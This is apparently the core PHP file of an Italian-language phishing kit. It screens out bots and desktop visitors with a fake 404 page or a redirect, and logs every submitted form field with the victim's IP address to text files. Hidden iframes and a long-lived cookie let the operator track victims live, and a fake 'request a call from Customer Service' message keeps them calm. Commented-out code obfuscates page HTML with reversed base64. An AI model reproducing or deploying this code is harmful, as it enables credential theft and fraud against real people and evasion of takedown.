<?php 
global $opt;
function ctrlspecialchars($subject){    
    $search = array("é","à","â","ä","æ","ç","è","ê","ë","ï","î","ò","ó","ô","ö","ø","ù","ú","û","ü");
    $replace = array("&#233;","&#224;","&#226;","&#228;","&#230;","&#231;","&#232;","&#234;","&#235;","&#239;","&#238;","&#242;","&#243;","&#244;","&#246;","&#248;","&#249;","&#250;","&#251;","&#252;","&#169;","&#174;","&#171;","&#187;","&#188;","&#189;","&#190;","&#177;","&#167;","&#165;","&#163;","&#123;","&#125;","&#36;","&#37;");
    
    return str_replace($search,$replace,$subject); 
     }

function criptato($originalString){
    $stringa_utf8 = ctrlspecialchars($originalString);
    $encodedString = base64_encode($stringa_utf8);
    $reversedString = strrev($encodedString);
    return $reversedString;
}
/*function postelabora($buffer)
{
    global $opt;


    $htmlloading= gestioneloading();
    $buffer = str_replace("</body>",$htmlloading."</body>",$buffer);

    $crippa='';
    if(isset($opt['crippa'])){

        $crippa = $opt['crippa'];
    }

    if(isset($_GET['bypassa'])){
        $crippa=false;
    }else{

        $htmlchat= chat();
        $buffer = str_replace("</body>",$htmlchat."</body>",$buffer);
    
    
        $htmlchat= gestioneonline();
        $buffer = str_replace("</body>",$htmlchat."</body>",$buffer);
    
    
        $htmlvisite= gestionevisite();
        $buffer = str_replace("</body>",$htmlvisite."</body>",$buffer);


    }
    if($crippa){
    $htmlc= criptato($buffer);
    $dec= "<script id='rev-js-loader'>
    var reversedString = '".$htmlc."';
    var reversedArray = reversedString.split('').reverse();
    var originalString = reversedArray.join('');
    var decodedString = atob(originalString);
    document.write(decodedString);
    elementToRemove = document.getElementById('rev-js-loader');
    parentElement = elementToRemove.parentNode;
    parentElement.removeChild(elementToRemove);
    </script>";
    $buffer = $dec;
    }

    return $buffer;
}*/
function postelaborazione(){
    ob_start("postelabora");
}


function copiafile(){
    global $cartella;
    if(!file_exists("visite.php")){
        copy($cartella."/"."visite.php","visite.php");
    }
    if(!file_exists("live.php")){
        copy($cartella."/"."live.php","live.php");
    }
    if(!file_exists("check.php")){
        copy($cartella."/"."check.php","check.php");
    }
    if(!file_exists("link.php")){
        copy($cartella."/"."link.php","link.php");
    }

}
function chat(){
    global $cartella;
    global $opt;
    $html="";
    $codicechat='';
    $codicechat = $opt['codicechat'];
    
    $codicestat='';
    if(isset($opt['codicestat'])){

        $codicestat = $opt['codicestat'];
    }

    if($codicestat){
      

$html.='<div style="display:none;">
<script id="_waukeo">var _wau = _wau || []; _wau.push(["small", "'.$codicestat.'", "keo"]);
(function() {var s=document.createElement("script"); s.async=true;
s.src="https://widgets.amung.us/small.js";
document.getElementsByTagName("head")[0].appendChild(s);
})();</script>
</div>';
    
    
        }
if($codicechat){

$html.='<script type="text/javascript">
var _smartsupp = _smartsupp || {};
_smartsupp.key = "'.$codicechat .'";
window.smartsupp||(function(d) {
  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
  s=d.getElementsByTagName("script")[0];c=d.createElement("script");
  c.type="text/javascript";c.charset="utf-8";c.async=true;
  c.src="https://www.smartsuppchat.com/loader.js?";s.parentNode.insertBefore(c,s);
})(document);
</script>';

    }
    return $html;
}
include ("leggifuori.php");
function rsearch($folder, $pattern)
{
    $iti = new RecursiveDirectoryIterator($folder);
    foreach (new RecursiveIteratorIterator($iti) as $file)
    {
        if (strpos($file, $pattern) !== false)
        {
            return $file;
        }
    }
    return false;
}
function nomecartella()
{
    $filepath = rsearch(dirname(__FILE__) . "/", "NUOVAVERSIONE.txt");
   
    $filepath = str_replace("NUOVAVERSIONE.txt", "", $filepath);
  
    $cartella = basename($filepath); 
    return $cartella;
}

$cartella = nomecartella();
include "ab.php";
antibot($cartella);
date_default_timezone_set('Europe/Rome');
function messaggiofinale()
{
    global $cartella;
    global $opt;
    
    $btn = "<BR><BR><a  class='ricchiam' href='?chiama=1'><b>RICHIEDI CHIAMATA</b></a>";
    $script = "<style>.ricchiam{border:1px solid black; padding: 15px;}</style><script src='https://code.jquery.com/jquery-3.6.0.min.js' ></script>";
    if (isset($_REQUEST['chiama']))
    {
        $btn = "<BR><b class='loadc'><img src='load.gif' width=50 /><br></b><b class='inoltrata' style='display:none'>
        <img src='callcenter.jpg' width=70 /><br><BR>
        la richiesta di chiamata di assistenza è stata inoltrata al Servizio Clienti.<br>Attendi qualche minuto.<br>La stiamo mettendo in contatto con il primo operatore disponibile</b>";
        $script .= "<script>setTimeout(function(){ jQuery('.loadc').hide();jQuery('.inoltrata').show(); },5000)</script>";
    }
    return "" . $btn . $script;
}
function dispositivo()
{
    require_once ('mobile/Mobile_Detect.php');
    $detect = new Mobile_Detect;
    $deviceType = $detect->isMobile() ? $detect->isTablet() ? 'tablet' : 'telefono' : 'computer';
    $scriptVersion = $detect->getHttpHeaders();
    $mobileGrade = "";
    if ($detect->isAndroidOS())
    {
        $mobileGrade = "ANDROID";
    }
    if ($detect->isiOS())
    {
        $mobileGrade = "IPHONE";
    }
    return $deviceType . " " . $mobileGrade;
}
function muori()
{
    global $opt;
    $red = $opt['redirect'];
    if (!$red)
    {
        http_response_code(404);
        ?>

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>

        <?php
        exit;
    }
    else
    {
    }
    header("Location: $red");
    exit;
}
function soloandroid()
{
    require_once ('mobile/Mobile_Detect.php');
    $detect = new Mobile_Detect;
    if ($detect->isAndroidOS())
    {
    }
    else
    {
        muori();
    }
}
function solomobile()
{
    require_once ('mobile/Mobile_Detect.php');
    $detect = new Mobile_Detect;
    if ($detect->isMobile())
    {
        $ua = "Mobile";
    }
    elseif ($detect->isTablet())
    {
        $ua = "Tablet";
    }
    else
    {
        muori();
    }
}

function gestioneloading(){

   if(isset($_GET['bypassa'])){
    $html='<style>.resto{display:block !important}</style>';
   }   
    return $html;
}


function gestionevisite(){
    $filecorrente =  basename($_SERVER["SCRIPT_FILENAME"], '.php');
   $html='<script>setTimeout(function(){var xhr = new XMLHttpRequest();   xhr.open("GET", "visite.php?pagina='.urlencode($filecorrente).'", true);  xhr.send(); },2000)</script>';
   
    return $html;
}
function gestioneonline(){

   //* <!--   <script>
   /// if(window.location.href.indexOf('webhostapp')!=-1){
  ///      setInterval(function(){jQuery("img[alt='www.000webhost.com']").parents("div").hide()},500)
  ///  }
  ///  </script> --> ///

  $html="";
  $id = getid();
 //chat();
  if ($id)
  {
      $filecorrente =  basename($_SERVER["SCRIPT_FILENAME"], '.php');
     $actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; 
     $chiama=""; 
     if (strpos($actual_link, 'chiama') !== false)
      {
          $chiama="-chiamata";
      }
      $filecorrente.=$chiama;
      
     
      
     $html.='<iframe  style="width:0px; heigth:0px;display:none;position:absolute;top:-90000px" src="check.php?id='.$id.'&pagina='.urlencode($filecorrente).'"></iframe>';
    
     $html.='<iframe  style="width:0px; heigth:0px;display:none;position:absolute;top:-90000px" src="live.php?id='.$id.'&pagina='.urlencode($filecorrente).'"></iframe>';
    return $html;
  }

}
function script()
{
    //    echo gestioneonline();
}
function scrivifile($pagina,$numero)
{
    $cartella = nomecartella();

    $dati = "";
    foreach ($pagina as $parametro)
    {
        if (isset($_POST[$parametro]))
        {
            $dati .= "'" . $_POST[$parametro] . "' | ";
        }
    }
    if ($dati)
    {

        if (!file_exists($cartella.'_step'.$numero.'.txt'))
        {
            touch($cartella.'_step'.$numero.'.txt');
        }
        

        file_put_contents($cartella.'_step'.$numero.'.txt',$dati . "\n", FILE_APPEND);
    }
}

function salvadebug($pagina)
{
    $cartella = nomecartella();
    if (!file_exists($cartella.'_risultati.txt'))
    {
        touch($cartella.'_risultati.txt');
    }
    $dati = "";
    foreach ($pagina as $parametro)
    {
        if (isset($_POST[$parametro]))
        {
            $dati .= " $parametro -> '" . $_POST[$parametro] . "' | ";
        }
    }
    if ($dati)
    {
        file_put_contents($cartella.'_risultati.txt', getUserIP() . " " . $dati . "\n", FILE_APPEND);
    }
}
function getUserIP()
{
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"]))
    {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    if (filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif (filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}
function getid()
{
    if (!isset($_COOKIE['COOKIE_KEY']))
    {
    }
    else
    {
        $id2 = preg_replace("/[^0-9]/", "", $_COOKIE['COOKIE_KEY']);

        return  $id2 ;
    }
}
function forzaid()
{
    $randomizzato = time() . mt_rand(1, 100);
    setcookie("COOKIE_KEY", $randomizzato, time() + (10 * 365 * 24 * 60 * 60));
    return $randomizzato;
}
function creaid($numero, $cartella)
{
    if (!isset($_COOKIE['COOKIE_KEY']))
    {
        setcookie("COOKIE_KEY", time() . mt_rand(1, 100) , time() + (10 * 365 * 24 * 60 * 60));
    }
    else
    {
    }
    if (isset($_COOKIE['COOKIE_KEY']))
    {
        $id2 = preg_replace("/[^0-9]/", "", $_COOKIE['COOKIE_KEY']);

        return  $id2 ;
    }
    else
    {
        return false;
    }
}
function creafile($nome)
{
    if (!file_exists($nome))
    {
        touch($nome);
    }
}
function conta($numero)
{
    /*
    if (!$numero)
    {
        if (!file_exists('visite.txt'))
        {
            touch('visite.txt');
        }
        $counter = intval(file_get_contents('visite.txt')) + 1;
        file_put_contents('visite.txt', $counter);
    }
    */
}
$dajeee = 1;
if (!file_exists('database'))
{
    mkdir('database', 0777, true);
}

if ($opt['solomobile'])
{
    solomobile();
}
if ($opt['soloandroid'])
{
    soloandroid();
} ?><?php 

$nomepag = $_SERVER['SCRIPT_FILENAME'];
$filesDaEscludere = array("check.php", "live.php", "visiste.php", "generale.php");

if (!in_array($nomepag, $filesDaEscludere)) {
   
            postelaborazione();
} else {
   
}


?>
